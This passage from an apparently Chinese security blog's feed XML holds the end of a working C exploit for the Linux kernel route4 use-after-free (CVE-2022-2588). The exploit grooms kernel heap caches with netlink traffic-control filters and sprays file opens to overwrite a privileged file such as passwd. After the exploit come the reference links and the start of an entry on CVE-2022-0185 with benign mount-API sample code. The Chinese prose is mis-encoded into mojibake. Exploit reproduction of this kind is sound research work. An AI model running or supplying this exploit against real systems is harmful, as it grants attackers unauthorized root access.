class="line">                pthread_create(&amp;pid, <span class="literal">NULL</span>, slow_write, <span class="literal">NULL</span>);</span><br><span class="line">                pthread_create(&amp;pid2, <span class="literal">NULL</span>, write_cmd, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (!run_spray)</span><br><span class="line">                &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                close(overlap_a);</span><br><span class="line">                close(overlap_b);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;closed overlap\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">                usleep(<span class="number">1000</span> * <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> spray_num = <span class="number">4096</span>;</span><br><span class="line">                write(pipe_file_spray[<span class="number">0</span>][<span class="number">1</span>], &amp;spray_num, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">                <span class="keyword">if</span> (read(pipe_file_spray[<span class="number">1</span>][<span class="number">0</span>], &amp;msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    err(<span class="number">1</span>, <span class="string">&quot;read from file spray&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                overlapped = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (overlapped)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">while</span> (run_write)</span><br><span class="line">    &#123;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!overlapped)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;no overlap found :(...\n&quot;</span>);</span><br><span class="line">        write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\xff&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> xx = open(target, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">0x100</span>] = &#123;&#125;;</span><br><span class="line">        <span class="comment">// check if user in the passwd</span></span><br><span class="line">        read(xx, buf, <span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(buf, <span class="string">&quot;user&quot;</span>, <span class="number">4</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\x00&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;not successful : %s\n&quot;</span>, buf);</span><br><span class="line">            write(pipe_main[<span class="number">1</span>], <span class="string">&quot;\xff&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sleep(<span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">post_exploit</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this poc assume we have a heap address leaked</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_exp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_parent) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;fail to create pipes\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_child) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;fail to create pipes\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_defrag) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;fail to create pipes\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_file_spray[<span class="number">0</span>]) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;fail to create pipes\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_file_spray[<span class="number">1</span>]) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;fail to create pipes\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// thread for spraying file we want to overwrite</span></span><br><span class="line">        adjust_rlimit();</span><br><span class="line">        <span class="keyword">int</span> spray_num = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (read(pipe_file_spray[<span class="number">0</span>][<span class="number">0</span>], &amp;spray_num, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)) &lt; <span class="keyword">sizeof</span>(<span class="keyword">int</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            err(<span class="number">1</span>, <span class="string">&quot;read file spray&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;got cmd, start spraying %s\n&quot;</span>, target);</span><br><span class="line">        spray_num = <span class="number">4096</span>;</span><br><span class="line">        <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                pin_on_cpu(i % cpu_cores);</span><br><span class="line">                open(target, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                sleep(<span class="number">10000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            pin_on_cpu(i % cpu_cores);</span><br><span class="line">            open(target, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;spray done\n&quot;</span>);</span><br><span class="line">        write(pipe_file_spray[<span class="number">1</span>][<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sleep(<span class="number">10000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">        pre_exploit();</span><br><span class="line">        exploit();</span><br><span class="line">        post_exploit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// do the defragmentation to exhaust all file slabs</span></span><br><span class="line">            <span class="comment">// for cross cache</span></span><br><span class="line">            adjust_rlimit();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                pin_on_cpu(i % cpu_cores);</span><br><span class="line">                open(target, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;defrag done\n&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (write(pipe_defrag[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;failed write defrag&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// memory spray thread</span></span><br><span class="line">            setup_namespace();</span><br><span class="line">            pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">int</span> sprayfd = socket(PF_NETLINK, SOCK_RAW, <span class="number">0</span>);</span><br><span class="line">            assert(sprayfd != <span class="number">-1</span>);</span><br><span class="line">            add_qdisc(sprayfd);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">char</span> msg[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">            <span class="keyword">char</span> payload[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line">            <span class="built_in">memset</span>(payload + <span class="number">0x10</span>, <span class="string">&#x27;A&#x27;</span>, <span class="number">256</span> - <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (read(pipe_defrag[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;failed read defrag&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// if the exploit keeps failing, please tune the middle and end</span></span><br><span class="line">            <span class="keyword">int</span> middle = <span class="number">38</span>;</span><br><span class="line">            <span class="keyword">int</span> end = middle + <span class="number">40</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// preparing for cross cache</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; middle; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                add_tc_basic(sprayfd, i + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            add_tc_basic(sprayfd, middle + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            add_tc_basic(sprayfd, middle + <span class="number">2</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            add_tc_basic(sprayfd, middle + <span class="number">3</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;write to parent\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// allocate route4</span></span><br><span class="line">            <span class="keyword">if</span> (read(pipe_parent[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;read from parent&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// add_tc_basic(sprayfd, middle+2, payload, 129, 32);</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// prepare another part for cross cache</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = middle + <span class="number">2</span>; i &lt; end; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                add_tc_basic(sprayfd, i + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;spray 256 done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; end - <span class="number">24</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// prevent double free of 192</span></span><br><span class="line">                <span class="comment">// and being reclaimed by others</span></span><br><span class="line">                <span class="keyword">if</span> (i == middle || i == middle + <span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                delete_tc_basic(sprayfd, i + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;write to parent\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// free route4 here</span></span><br><span class="line">            <span class="keyword">if</span> (read(pipe_parent[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;read from parent&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// if (cpu_cores == 1) sleep(1);</span></span><br><span class="line">            delete_tc_basic(sprayfd, middle + <span class="number">2</span>);</span><br><span class="line">            delete_tc_basic(sprayfd, middle + <span class="number">3</span>);</span><br><span class="line">            delete_tc_basic(sprayfd, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = middle + <span class="number">2</span>; i &lt; end; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                delete_tc_basic(sprayfd, i + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;256 freed done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;write to parent\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    global = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE | PROT_EXEC,</span><br><span class="line">                          MAP_SHARED | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(global, <span class="number">0</span>, <span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">    self_path = global;</span><br><span class="line">    <span class="built_in">snprintf</span>(self_path, <span class="number">0x100</span>, <span class="string">&quot;%s/%s&quot;</span>, get_current_dir_name(), argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;self path %s\n&quot;</span>, self_path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(target, <span class="number">0</span>);</span><br><span class="line">    content = (<span class="keyword">char</span> *)(global + <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(content, overwrite);</span><br><span class="line">    read(fd, content + <span class="built_in">strlen</span>(overwrite), <span class="number">0x1000</span>);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    assert(pipe(pipe_main) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prepare done\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        run_exp();</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sleep(<span class="number">10000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> data;</span><br><span class="line">    read(pipe_main[<span class="number">0</span>], &amp;data, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (data == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;succeed\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>å‚è€ƒé“¾æ¥ï¼š</p><p>â€‹    <a class="link"   href="https://github.com/Markakd/CVE-2022-2588" >https://github.com/Markakd/CVE-2022-2588<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://paper.seebug.org/2019/" >https://paper.seebug.org/2019/<i class="fas fa-external-link-alt"></i></a></p><p>â€‹    <a class="link"   href="https://elixir.bootlin.com/linux/v5.14/source" >https://elixir.bootlin.com/linux/v5.14/source<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;æœ¬æ¥ä¸æƒ³åˆ†æCVEäº†ï¼Œæ— å¥ˆå‰é¢æåˆ°äº†å†…æ ¸å†…éƒ¨éš”ç¦»æœºåˆ¶ï¼Œè€Œåœ¨å¾€æœŸçš„æ–‡ç« ä¸­åªåœ¨&lt;a class=&quot;link&quot;   href=&quot;https://c</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    <category term="CVEå¤ç°" scheme="https://196082.github.io/categories/Linux-Kernel/CVE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Rtnetlink" scheme="https://196082.github.io/tags/Rtnetlink/"/>
    
    <category term="Dirty Cred" scheme="https://196082.github.io/tags/Dirty-Cred/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-0185å¤ç°</title>
    <link href="https://196082.github.io/2023/10/15/CVE-2022-0185/"/>
    <id>https://196082.github.io/2023/10/15/CVE-2022-0185/</id>
    <published>2023-10-15T09:03:20.000Z</published>
    <updated>2023-11-29T10:11:19.513Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…¶å®å¹¶ä¸æ˜¯å¾ˆæƒ³å¤ç°è¿™ä¸ªæ´ï¼Œä½†æ˜¯åœ¨å‰äº›å¤©fmyyå‘Šè¯‰äº†æˆ‘ä¸€ä¸ªåˆ©ç”¨æ–¹å¼<code>fuse</code>ï¼Œè™½ç„¶ä»–ä¹Ÿç»™æˆ‘æ¨èäº†å¯¹åº”çš„CVEï¼Œä¸è¿‡æˆ‘æ›´åŠ æ„¿æ„çœ‹å¢¨æ™šé¸¢ä½¬çš„åšå®¢ã€‚è¿™ä¸ªCVEå¤ç°ç»“æŸä¹‹ååº”è¯¥ä¼šæœ‰å¾ˆé•¿ä¸€æ®µæ—¶é—´ä¸ä¼šç»§ç»­å¤ç°CVEäº†ï¼Œåç»­çš„æ‰“ç®—æ˜¯æ›´å¤šçš„å­¦ä¹ <code>kernel fuzz</code>ã€‚</p><p><a class="link"   href="https://www.willsroot.io/2022/01/cve-2022-0185.html" >https://www.willsroot.io/2022/01/cve-2022-0185.html<i class="fas fa-external-link-alt"></i></a> è¿™é‡Œæ˜¯è¿™ä¸ªCVEå‘ç°è€…çš„æ–‡ç« ï¼Œé‡Œé¢æåˆ°äº†å…¶æ˜¯è¢«<code>syzkaller</code>ç»™fuzzå‡ºæ¥çš„ã€‚</p><h2 id="Filesystem-mount-API-åˆ†æ"><a href="#Filesystem-mount-API-åˆ†æ" class="headerlink" title="Filesystem mount API åˆ†æ"></a>Filesystem mount API åˆ†æ</h2><p>åœ¨Linuxä¸‹çš„æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½ï¼Œ<code>mount</code> ç³»ç»Ÿè°ƒç”¨è¢«ç”¨ä»¥å°†æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°ä»¥ <code>/</code> ä¸ºæ ¹èŠ‚ç‚¹çš„æ–‡ä»¶æ ‘ä¸Šï¼Œä¾‹å¦‚æˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤æŒ‚è½½ç¡¬ç›˜ <code>/dev/sdb1</code> åˆ° <code>/mnt/temp</code> ç›®å½•ä¸‹ï¼Œä¹‹åå°±èƒ½åœ¨è¯¥ç›®å½•ä¸‹è¿›è¡Œæ–‡ä»¶è®¿é—®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount /dev/sdb1 /mnt/temp</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Usage: moount &#123;dev_path&#125; &#123;mount_point&#125; &#123;fs_type&#125;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mount(argv[<span class="number">1</span>], argv[<span class="number">2</span>], argv[<span class="number">3</span>], <span class="number">0</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] Failed to mount %s at %s by file system type: %s!\n&quot;</span>, </span><br><span class="line">              argv[<span class="number">1</span>], argv[<span class="number">2</span>], argv[<span class="number">3</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Successful to mount %s at %s by file system type: %s.\n&quot;</span>, </span><br><span class="line">              argv[<span class="number">1</span>], argv[<span class="number">2</span>], argv[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶è€Œæ–°çš„<code>mount API</code>å°†ä¸Šé¢çš„ä¸€ä¸ªç®€å•çš„<code>mount</code>ç³»ç»Ÿè°ƒç”¨çš„åŠŸèƒ½æ‹†åˆ†æˆäº†å¤šä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¤šä¸ªç³»ç»Ÿè°ƒç”¨åˆ†åˆ«å¯¹åº”äº†ä¸åŒæ–‡ä»¶ç³»ç»ŸæŒ‚è½½é˜¶æ®µã€‚</p><h3 id="fsopen"><a href="#fsopen" class="headerlink" title="fsopen"></a>fsopen</h3><p>åœ¨Linuxä¸­ä¸€ç›´ç§‰æŒç€ä¸€åˆ‡çš†æ–‡ä»¶çš„æ€æƒ³ï¼Œåœ¨æ–°çš„<code>mount API</code>ä¸­ä¹Ÿæœ‰å¯¹åº”çš„æ˜ ç…§ï¼Œé¦–å…ˆåˆ™æ˜¯<code>fsopen</code>å°±ç±»ä¼¼äº<code>open</code>ç³»ç»Ÿè°ƒç”¨ï¼Œå…¶ç”¨äºæ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶è¿”å›ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿæè¿°ç¬¦(ç§°ä¸ºæ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡)ã€‚</p><p>ç”±äºæ ‡å‡†åº“ä¸­è¿˜æœªæ·»åŠ å…¶ç›¸å…³ä»£ç ï¼Œå› æ­¤éœ€è¦æ‰‹å†™<code>raw syscall</code>æ¥è¿›è¡Œç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨ï¼Œä¾‹å¦‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç æ‰“å¼€ä¸€ä¸ªç©ºç™½çš„ <code>ext4</code> æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡ï¼ˆéœ€è¦ <code>CAP_SYS_ADMIN</code> æƒé™ï¼Œæˆ–æ˜¯å¼€å¯äº† <code>unprivileged namespace</code> çš„æƒ…å†µä¸‹ä½¿ç”¨ <code>unshare()</code> ç³»ç»Ÿè°ƒç”¨åˆ›å»ºå¸¦æœ‰è¯¥æƒé™çš„ <code>namespace</code>ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsopen</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsopen 430</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsopen, fs_name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fs_fd;</span><br><span class="line">    </span><br><span class="line">    fs_fd = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fs_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] FAILED to fsopen!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 